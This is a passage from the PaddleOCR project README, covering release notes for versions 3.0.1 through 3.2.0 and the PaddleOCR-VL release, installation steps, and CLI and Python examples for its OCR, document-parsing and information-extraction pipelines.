      &lt;li&gt;&lt;strong&gt;SOTA Performance on Document Parsing&lt;/strong&gt;: PaddleOCR-VL achieves state-of-the-art performance in both page-level document parsing and element-level recognition. It significantly outperforms existing pipeline-based solutions and exhibiting strong competitiveness against leading vision-language models (VLMs) in document parsing. Moreover, it excels in recognizing complex document elements, such as text, tables, formulas, and charts, making it suitable for a wide range of challenging content types, including handwritten text and historical documents. This makes it highly versatile and suitable for a wide range of document types and scenarios.&lt;/li&gt; 
      &lt;li&gt;&lt;strong&gt;Multilingual Support&lt;/strong&gt;: PaddleOCR-VL Supports 109 languages, covering major global languages, including but not limited to Chinese, English, Japanese, Latin, and Korean, as well as languages with different scripts and structures, such as Russian (Cyrillic script), Arabic, Hindi (Devanagari script), and Thai. This broad language coverage substantially enhances the applicability of our system to multilingual and globalized document processing scenarios.&lt;/li&gt; 
     &lt;/ul&gt; &lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Released PP-OCRv5 Multilingual Recognition Model:&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Improved the accuracy and coverage of Latin script recognition; added support for Cyrillic, Arabic, Devanagari, Telugu, Tamil, and other language systems, covering recognition of 109 languages. The model has only 2M parameters, and the accuracy of some models has increased by over 40% compared to the previous generation.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;2025.08.21: Release of PaddleOCR 3.2.0&lt;/strong&gt;&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Significant Model Additions:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Introduced training, inference, and deployment for PP-OCRv5 recognition models in English, Thai, and Greek. &lt;strong&gt;The PP-OCRv5 English model delivers an 11% improvement in English scenarios compared to the main PP-OCRv5 model, with the Thai and Greek recognition models achieving accuracies of 82.68% and 89.28%, respectively.&lt;/strong&gt;&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Deployment Capability Upgrades:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;&lt;strong&gt;Full support for PaddlePaddle framework versions 3.1.0 and 3.1.1.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;Comprehensive upgrade of the PP-OCRv5 C++ local deployment solution, now supporting both Linux and Windows, with feature parity and identical accuracy to the Python implementation.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;High-performance inference now supports CUDA 12, and inference can be performed using either the Paddle Inference or ONNX Runtime backends.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;The high-stability service-oriented deployment solution is now fully open-sourced, allowing users to customize Docker images and SDKs as required.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;The high-stability service-oriented deployment solution also supports invocation via manually constructed HTTP requests, enabling client-side code development in any programming language.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Benchmark Support:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;&lt;strong&gt;All production lines now support fine-grained benchmarking, enabling measurement of end-to-end inference time as well as per-layer and per-module latency data to assist with performance analysis. &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/docs/version3.x/pipeline_usage/instructions/benchmark.en.md"&gt;Here's&lt;/a&gt; how to set up and use the benchmark feature.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;Documentation has been updated to include key metrics for commonly used configurations on mainstream hardware, such as inference latency and memory usage, providing deployment references for users.&lt;/strong&gt;&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Bug Fixes:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Resolved the issue of failed log saving during model training.&lt;/li&gt; 
    &lt;li&gt;Upgraded the data augmentation component for formula models for compatibility with newer versions of the albumentations dependency, and fixed deadlock warnings when using the tokenizers package in multi-process scenarios.&lt;/li&gt; 
    &lt;li&gt;Fixed inconsistencies in switch behaviors (e.g., &lt;code&gt;use_chart_parsing&lt;/code&gt;) in the PP-StructureV3 configuration files compared to other pipelines.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Other Enhancements:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;&lt;strong&gt;Separated core and optional dependencies. Only minimal core dependencies are required for basic text recognition; additional dependencies for document parsing and information extraction can be installed as needed.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;Enabled support for NVIDIA RTX 50 series graphics cards on Windows; users can refer to the &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/docs/version3.x/installation.en.md"&gt;installation guide&lt;/a&gt; for the corresponding PaddlePaddle framework versions.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;PP-OCR series models now support returning single-character coordinates.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;Added AIStudio, ModelScope, and other model download sources, allowing users to specify the source for model downloads.&lt;/li&gt; 
    &lt;li&gt;Added support for chart-to-table conversion via the PP-Chart2Table module.&lt;/li&gt; 
    &lt;li&gt;Optimized documentation descriptions to improve usability.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;2025.08.15: PaddleOCR 3.1.1 Released&lt;/strong&gt;&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Bug Fixes:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Added the missing methods &lt;code&gt;save_vector&lt;/code&gt;, &lt;code&gt;save_visual_info_list&lt;/code&gt;, &lt;code&gt;load_vector&lt;/code&gt;, and &lt;code&gt;load_visual_info_list&lt;/code&gt; in the &lt;code&gt;PP-ChatOCRv4&lt;/code&gt; class.&lt;/li&gt; 
    &lt;li&gt;Added the missing parameters &lt;code&gt;glossary&lt;/code&gt; and &lt;code&gt;llm_request_interval&lt;/code&gt; to the &lt;code&gt;translate&lt;/code&gt; method in the &lt;code&gt;PPDocTranslation&lt;/code&gt; class.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Documentation Improvements:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Added a demo to the MCP documentation.&lt;/li&gt; 
    &lt;li&gt;Added information about the PaddlePaddle and PaddleOCR version used for performance metrics testing in the documentation.&lt;/li&gt; 
    &lt;li&gt;Fixed errors and omissions in the production line document translation.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Others:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Changed the MCP server dependency to use the pure Python library &lt;code&gt;puremagic&lt;/code&gt; instead of &lt;code&gt;python-magic&lt;/code&gt; to reduce installation issues.&lt;/li&gt; 
    &lt;li&gt;Retested PP-OCRv5 performance metrics with PaddleOCR version 3.1.0 and updated the documentation.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;2025.06.29: PaddleOCR 3.1.0 Released&lt;/strong&gt;&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Key Models and Pipelines:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;&lt;strong&gt;Added PP-OCRv5 Multilingual Text Recognition Model&lt;/strong&gt;, which supports the training and inference process for text recognition models in 37 languages, including French, Spanish, Portuguese, Russian, Korean, etc. &lt;strong&gt;Average accuracy improved by over 30%.&lt;/strong&gt; &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/algorithm/PP-OCRv5/PP-OCRv5_multi_languages.html"&gt;Details&lt;/a&gt;&lt;/li&gt; 
    &lt;li&gt;Upgraded the &lt;strong&gt;PP-Chart2Table model&lt;/strong&gt; in PP-StructureV3, further enhancing the capability of converting charts to tables. On internal custom evaluation sets, the metric (RMS-F1) &lt;strong&gt;increased by 9.36 percentage points (71.24% -&amp;gt; 80.60%).&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;Newly launched &lt;strong&gt;document translation pipeline, PP-DocTranslation, based on PP-StructureV3 and ERNIE 4.5&lt;/strong&gt;, which supports the translation of Markdown format documents, various complex-layout PDF documents, and document images, with the results saved as Markdown format documents. &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/pipeline_usage/PP-DocTranslation.html"&gt;Details&lt;/a&gt;&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;New MCP server:&lt;/strong&gt; &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/deployment/mcp_server.html"&gt;Details&lt;/a&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;&lt;strong&gt;Supports both OCR and PP-StructureV3 pipelines.&lt;/strong&gt;&lt;/li&gt; 
    &lt;li&gt;Supports three working modes: local Python library, AIStudio Community Cloud Service, and self-hosted service.&lt;/li&gt; 
    &lt;li&gt;Supports invoking local services via stdio and remote services via Streamable HTTP.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Documentation Optimization:&lt;/strong&gt; Improved the descriptions in some user guides for a smoother reading experience.&lt;/p&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;2025.06.26: PaddleOCR 3.0.3 Released&lt;/strong&gt;&lt;/summary&gt; - Bug Fix: Resolved the issue where the `enable_mkldnn` parameter was not effective, restoring the default behavior of using MKL-DNN for CPU inference. 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;2025.06.19: PaddleOCR 3.0.2 Released&lt;/strong&gt;&lt;/summary&gt; - **New Features:** 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;The default download source has been changed from &lt;code&gt;BOS&lt;/code&gt; to &lt;code&gt;HuggingFace&lt;/code&gt;. Users can also change the environment variable &lt;code&gt;PADDLE_PDX_MODEL_SOURCE&lt;/code&gt; to &lt;code&gt;BOS&lt;/code&gt; to set the model download source back to Baidu Object Storage (BOS).&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Added service invocation examples for six languages‚ÄîC++, Java, Go, C#, Node.js, and PHP‚Äîfor pipelines like PP-OCRv5, PP-StructureV3, and PP-ChatOCRv4.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Improved the layout partition sorting algorithm in the PP-StructureV3 pipeline, enhancing the sorting logic for complex vertical layouts to deliver better results.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Enhanced model selection logic: when a language is specified but a model version is not, the system will automatically select the latest model version supporting that language.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Set a default upper limit for MKL-DNN cache size to prevent unlimited growth, while also allowing users to configure cache capacity.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Updated default configurations for high-performance inference to support Paddle MKL-DNN acceleration and optimized the logic for automatic configuration selection for smarter choices.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Adjusted the logic for obtaining the default device to consider the actual support for computing devices by the installed Paddle framework, making program behavior more intuitive.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Added Android example for PP-OCRv5. &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/deployment/on_device_deployment.html"&gt;Details&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Bug Fixes:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Fixed an issue with some CLI parameters in PP-StructureV3 not taking effect.&lt;/li&gt; 
    &lt;li&gt;Resolved an issue where &lt;code&gt;export_paddlex_config_to_yaml&lt;/code&gt; would not function correctly in certain cases.&lt;/li&gt; 
    &lt;li&gt;Corrected the discrepancy between the actual behavior of &lt;code&gt;save_path&lt;/code&gt; and its documentation description.&lt;/li&gt; 
    &lt;li&gt;Fixed potential multithreading errors when using MKL-DNN in basic service deployment.&lt;/li&gt; 
    &lt;li&gt;Corrected channel order errors in image preprocessing for the Latex-OCR model.&lt;/li&gt; 
    &lt;li&gt;Fixed channel order errors in saving visualized images within the text recognition module.&lt;/li&gt; 
    &lt;li&gt;Resolved channel order errors in visualized table results within PP-StructureV3 pipeline.&lt;/li&gt; 
    &lt;li&gt;Fixed an overflow issue in the calculation of &lt;code&gt;overlap_ratio&lt;/code&gt; under extremely special circumstances in the PP-StructureV3 pipeline.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Documentation Improvements:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Updated the description of the &lt;code&gt;enable_mkldnn&lt;/code&gt; parameter in the documentation to accurately reflect the program's actual behavior.&lt;/li&gt; 
    &lt;li&gt;Fixed errors in the documentation regarding the &lt;code&gt;lang&lt;/code&gt; and &lt;code&gt;ocr_version&lt;/code&gt; parameters.&lt;/li&gt; 
    &lt;li&gt;Added instructions for exporting pipeline configuration files via CLI.&lt;/li&gt; 
    &lt;li&gt;Fixed missing columns in the performance data table for PP-OCRv5.&lt;/li&gt; 
    &lt;li&gt;Refined benchmark metrics for PP-StructureV3 across different configurations.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;Others:&lt;/strong&gt;&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Relaxed version restrictions on dependencies like numpy and pandas, restoring support for Python 3.12.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;History Log&lt;/strong&gt;&lt;/summary&gt; 
 &lt;p&gt;2025.06.05: &lt;strong&gt;PaddleOCR 3.0.1 Released&lt;/strong&gt;, includes:&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;strong&gt;Optimisation of certain models and model configurations:&lt;/strong&gt; 
   &lt;ul&gt; 
    &lt;li&gt;Updated the default model configuration for PP-OCRv5, changing both detection and recognition from mobile to server models. To improve default performance in most scenarios, the parameter &lt;code&gt;limit_side_len&lt;/code&gt; in the configuration has been changed from 736 to 64.&lt;/li&gt; 
    &lt;li&gt;Added a new text line orientation classification model &lt;code&gt;PP-LCNet_x1_0_textline_ori&lt;/code&gt; with an accuracy of 99.42%. The default text line orientation classifier for OCR, PP-StructureV3, and PP-ChatOCRv4 pipelines has been updated to this model.&lt;/li&gt; 
    &lt;li&gt;Optimized the text line orientation classification model &lt;code&gt;PP-LCNet_x0_25_textline_ori&lt;/code&gt;, improving accuracy by 3.3 percentage points to a current accuracy of 98.85%.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Optimizations and fixes for some issues in version 3.0.0, &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/update/update.html"&gt;details&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;üî•üî•2025.05.20: Official Release of &lt;strong&gt;PaddleOCR v3.0&lt;/strong&gt;, including:&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;PP-OCRv5&lt;/strong&gt;: High-Accuracy Text Recognition Model for All Scenarios - Instant Text from Images/PDFs.&lt;/p&gt; 
   &lt;ol&gt; 
    &lt;li&gt;üåê Single-model support for &lt;strong&gt;five&lt;/strong&gt; text types - Seamlessly process &lt;strong&gt;Simplified Chinese, Traditional Chinese, Simplified Chinese Pinyin, English&lt;/strong&gt; and &lt;strong&gt;Japanese&lt;/strong&gt; within a single model.&lt;/li&gt; 
    &lt;li&gt;‚úçÔ∏è Improved &lt;strong&gt;handwriting recognition&lt;/strong&gt;: Significantly better at complex cursive scripts and non-standard handwriting.&lt;/li&gt; 
    &lt;li&gt;üéØ &lt;strong&gt;13-point accuracy gain&lt;/strong&gt; over PP-OCRv4, achieving state-of-the-art performance across a variety of real-world scenarios.&lt;/li&gt; 
   &lt;/ol&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;PP-StructureV3&lt;/strong&gt;: General-Purpose Document Parsing ‚Äì Unleash SOTA Images/PDFs Parsing for Real-World Scenarios!&lt;/p&gt; 
   &lt;ol&gt; 
    &lt;li&gt;üßÆ &lt;strong&gt;High-Accuracy multi-scene PDF parsing&lt;/strong&gt;, leading both open- and closed-source solutions on the OmniDocBench benchmark.&lt;/li&gt; 
    &lt;li&gt;üß† Specialized capabilities include &lt;strong&gt;seal recognition&lt;/strong&gt;, &lt;strong&gt;chart-to-table conversion&lt;/strong&gt;, &lt;strong&gt;table recognition with nested formulas/images&lt;/strong&gt;, &lt;strong&gt;vertical text document parsing&lt;/strong&gt;, and &lt;strong&gt;complex table structure analysis&lt;/strong&gt;.&lt;/li&gt; 
   &lt;/ol&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;&lt;strong&gt;PP-ChatOCRv4&lt;/strong&gt;: Intelligent Document Understanding ‚Äì Extract Key Information, not just text from Images/PDFs.&lt;/p&gt; 
   &lt;ol&gt; 
    &lt;li&gt;üî• &lt;strong&gt;15-point accuracy gain&lt;/strong&gt; in key-information extraction on PDF/PNG/JPG files over the previous generation.&lt;/li&gt; 
    &lt;li&gt;üíª Native support for &lt;strong&gt;ERNIE 4.5&lt;/strong&gt;, with compatibility for large-model deployments via PaddleNLP, Ollama, vLLM, and more.&lt;/li&gt; 
    &lt;li&gt;ü§ù Integrated &lt;a href="https://github.com/PaddlePaddle/PaddleMIX/tree/develop/paddlemix/examples/ppdocbee2"&gt;PP-DocBee2&lt;/a&gt;, enabling extraction and understanding of printed text, handwriting, seals, tables, charts, and other common elements in complex documents.&lt;/li&gt; 
   &lt;/ol&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;p&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/update/update.html"&gt;History Log&lt;/a&gt;&lt;/p&gt; 
&lt;/details&gt; 
&lt;h2&gt;‚ö° Quick Start&lt;/h2&gt; 
&lt;h3&gt;1. Run online demo&lt;/h3&gt; 
&lt;p&gt;&lt;a href="https://aistudio.baidu.com/community/app/91660/webUI"&gt;&lt;img src="https://img.shields.io/badge/PP_OCRv5-AI_Studio-green" alt="AI Studio" /&gt;&lt;/a&gt; &lt;a href="https://aistudio.baidu.com/community/app/518494/webUI"&gt;&lt;img src="https://img.shields.io/badge/PP_StructureV3-AI_Studio-green" alt="AI Studio" /&gt;&lt;/a&gt; &lt;a href="https://aistudio.baidu.com/community/app/518493/webUI"&gt;&lt;img src="https://img.shields.io/badge/PP_ChatOCRv4-AI_Studio-green" alt="AI Studio" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;2. Installation&lt;/h3&gt; 
&lt;p&gt;Install PaddlePaddle refer to &lt;a href="https://www.paddlepaddle.org.cn/en/install/quick?docurl=/documentation/docs/en/develop/install/pip/linux-pip_en.html"&gt;Installation Guide&lt;/a&gt;, after then, install the PaddleOCR toolkit.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# If you only want to use the basic text recognition feature (returns text position coordinates and content), including the PP-OCR series
python -m pip install paddleocr
# If you want to use all features such as document parsing, document understanding, document translation, key information extraction, etc.
# python -m pip install "paddleocr[all]"
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Starting from version 3.2.0, in addition to the &lt;code&gt;all&lt;/code&gt; dependency group demonstrated above, PaddleOCR also supports installing partial optional features by specifying other dependency groups. All dependency groups provided by PaddleOCR are as follows:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Dependency Group Name&lt;/th&gt; 
   &lt;th&gt;Corresponding Functionality&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;doc-parser&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Document parsing: can be used to extract layout elements such as tables, formulas, stamps, images, etc. from documents; includes models like PP-StructureV3, PaddleOCR-VL&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;ie&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Information extraction: can be used to extract key information from documents, such as names, dates, addresses, amounts, etc.; includes models like PP-ChatOCRv4&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;trans&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Document translation: can be used to translate documents from one language to another; includes models like PP-DocTranslation&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;all&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Complete functionality&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;3. Run inference by CLI&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Run PP-OCRv5 inference
paddleocr ocr -i https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/general_ocr_002.png --use_doc_orientation_classify False --use_doc_unwarping False --use_textline_orientation False  

# Run PP-StructureV3 inference
paddleocr pp_structurev3 -i https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/pp_structure_v3_demo.png --use_doc_orientation_classify False --use_doc_unwarping False

# Get the Qianfan API Key at first, and then run PP-ChatOCRv4 inference
paddleocr pp_chatocrv4_doc -i https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/vehicle_certificate-1.png -k È©æÈ©∂ÂÆ§ÂáÜ‰πò‰∫∫Êï∞ --qianfan_api_key your_api_key --use_doc_orientation_classify False --use_doc_unwarping False 

# Run PaddleOCR-VL inference
paddleocr doc_parser -i https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/paddleocr_vl_demo.png

# Get more information about "paddleocr ocr"
paddleocr ocr --help
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;4. Run inference by API&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;4.1 PP-OCRv5 Example&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Initialize PaddleOCR instance
from paddleocr import PaddleOCR
ocr = PaddleOCR(
    use_doc_orientation_classify=False,
    use_doc_unwarping=False,
    use_textline_orientation=False)

# Run OCR inference on a sample image 
result = ocr.predict(
    input="https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/general_ocr_002.png")

# Visualize the results and save the JSON results
for res in result:
    res.print()
    res.save_to_img("output")
    res.save_to_json("output")
&lt;/code&gt;&lt;/pre&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;4.2 PP-StructureV3 Example&lt;/strong&gt;&lt;/summary&gt; 
 &lt;pre&gt;&lt;code class="language-python"&gt;from pathlib import Path
from paddleocr import PPStructureV3

pipeline = PPStructureV3(
    use_doc_orientation_classify=False,
    use_doc_unwarping=False
)

# For Image
output = pipeline.predict(
    input="https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/pp_structure_v3_demo.png",
)

# Visualize the results and save the JSON results
for res in output:
    res.print() 
    res.save_to_json(save_path="output") 
    res.save_to_markdown(save_path="output")           
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;4.3 PP-ChatOCRv4 Example&lt;/strong&gt;&lt;/summary&gt; 
 &lt;pre&gt;&lt;code class="language-python"&gt;from paddleocr import PPChatOCRv4Doc

chat_bot_config = {
    "module_name": "chat_bot",
    "model_name": "ernie-3.5-8k",
    "base_url": "https://qianfan.baidubce.com/v2",
    "api_type": "openai",
    "api_key": "api_key",  # your api_key
}

retriever_config = {
    "module_name": "retriever",
    "model_name": "embedding-v1",
    "base_url": "https://qianfan.baidubce.com/v2",
    "api_type": "qianfan",
    "api_key": "api_key",  # your api_key
}

pipeline = PPChatOCRv4Doc(
    use_doc_orientation_classify=False,
    use_doc_unwarping=False
)

visual_predict_res = pipeline.visual_predict(
    input="https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/vehicle_certificate-1.png",
    use_common_ocr=True,
    use_seal_recognition=True,
    use_table_recognition=True,
)

mllm_predict_info = None
use_mllm = False
# If a multimodal large model is used, the local mllm service needs to be started. You can refer to the documentation: https://github.com/PaddlePaddle/PaddleX/blob/release/3.0/docs/pipeline_usage/tutorials/vlm_pipelines/doc_understanding.en.md performs deployment and updates the mllm_chat_bot_config configuration.
if use_mllm:
    mllm_chat_bot_config = {
        "module_name": "chat_bot",
        "model_name": "PP-DocBee",
        "base_url": "http://127.0.0.1:8080/",  # your local mllm service url
        "api_type": "openai",
        "api_key": "api_key",  # your api_key
    }

    mllm_predict_res = pipeline.mllm_pred(
        input="https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/vehicle_certificate-1.png",
        key_list=["È©æÈ©∂ÂÆ§ÂáÜ‰πò‰∫∫Êï∞"],
        mllm_chat_bot_config=mllm_chat_bot_config,
    )
    mllm_predict_info = mllm_predict_res["mllm_res"]

visual_info_list = []
for res in visual_predict_res:
    visual_info_list.append(res["visual_info"])
    layout_parsing_result = res["layout_parsing_result"]

vector_info = pipeline.build_vector(
    visual_info_list, flag_save_bytes_vector=True, retriever_config=retriever_config
)
chat_result = pipeline.chat(
    key_list=["È©æÈ©∂ÂÆ§ÂáÜ‰πò‰∫∫Êï∞"],
    visual_info=visual_info_list,
    vector_info=vector_info,
    mllm_predict_info=mllm_predict_info,
    chat_bot_config=chat_bot_config,
    retriever_config=retriever_config,
)
print(chat_result)
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;4.4 PaddleOCR-VL Example&lt;/strong&gt;&lt;/summary&gt; 
 &lt;pre&gt;&lt;code class="language-python"&gt;from paddleocr import PaddleOCRVL

pipeline = PaddleOCRVL()
output = pipeline.predict("https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/paddleocr_vl_demo.png")
for res in output:
    res.print()
    res.save_to_json(save_path="output")
    res.save_to_markdown(save_path="output")
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;h3&gt;5. Chinese Heterogeneous AI Accelerators&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/version3.x/other_devices_support/paddlepaddle_install_NPU.html"&gt;Huawei Ascend&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/version3.x/other_devices_support/paddlepaddle_install_XPU.html"&gt;KUNLUNXIN&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üß© More Features&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Convert models to ONNX format: &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/deployment/obtaining_onnx_models.html"&gt;Obtaining ONNX Models&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;Accelerate inference using engines like OpenVINO, ONNX Runtime, TensorRT, or perform inference using ONNX format models: &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/deployment/high_performance_inference.html"&gt;High-Performance Inference&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;Accelerate inference using multi-GPU and multi-process: &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/pipeline_usage/instructions/parallel_inference.html"&gt;Parallel Inference for Pipelines&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;Integrate PaddleOCR into applications written in C++, C#, Java, etc.: &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/deployment/serving.html"&gt;Serving&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;‚õ∞Ô∏è Advanced Tutorials&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/version3.x/pipeline_usage/OCR.html"&gt;PP-OCRv5 Tutorial&lt;/a&gt;&lt;/li&gt; 
